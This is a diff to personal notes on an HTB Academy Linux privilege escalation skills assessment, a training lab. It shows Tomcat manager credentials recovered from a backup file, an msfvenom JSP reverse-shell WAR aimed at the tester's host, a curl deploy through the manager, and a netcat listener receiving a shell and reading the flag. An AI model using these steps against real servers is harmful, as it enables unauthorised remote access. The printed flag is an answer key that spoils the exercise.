@@ -12,7 +12,7 @@ Academy_LLPE!
 
 IP
 ```python
-10.129.30.244
+10.129.85.233
 ```
 
 SSH
@@ -227,7 +227,11 @@ udp        0      0 10.129.85.233:68        0.0.0.0:*
 Webpage
 - 10.129.85.233:8080 requests a username and password. From the output of the /etc/passwd file they're are three other users: mrb3n, barry, tomcat.
 - barry didn't work, nor did mrb3n
-- No home folder for tomcat...because it's the default user for the web server application
+- No home folder for tomcat...because it's the default user for the web server application'
+
+```python
+http://10.129.85.233:8080 
+```
 
 Searching for tomcat files, I found two files: tomcat-users.xml and tomcat-users.xml.bak
 ```python
@@ -258,7 +262,7 @@ curl -s http://10.129.85.233:8080/docs/ | grep Tomcat
 
 MSF Venom Reverse Shell
 ```python
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.129.85.233 LPORT=8888 -f war -o revshell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.49 LPORT=4444 -f war -o revshell.war
 ```
 
 
@@ -267,13 +271,30 @@ Upload war file
 curl --upload-file revshell.war -u 'tomcatadm:T0mc@t_s3cret_p@ss!' "http://10.129.85.233:8080/manager/text/deploy?path=/monshell"
 ```
 
-Received a "403 Access Denied" message
->[!info ] 
-> "You are not authorized to view this page. By default the Manager is only accessible from a browser running on the same machine as Tomcat. If you wish to modify this restriction, you'll need to edit the Manager's context.xml file."
+Got the Flag!
+```python
+(dan㉿ZeroSigma)-[~/…/HTB-Academy/9-Linux Privilege Escalation/Linux Internals-based Privilege Escalation/Skills Assessment]
+└─$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.49] from (UNKNOWN) [10.129.85.233] 36528
+
+id
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
 
 
+ls  
+conf
+flag4.txt
+lib
+logs
+policy
+webapps
+work
+    
+cat flag4.txt   
+LLPE{im_th3_m@nag3r_n0w}
 
-
+```
 
 
 
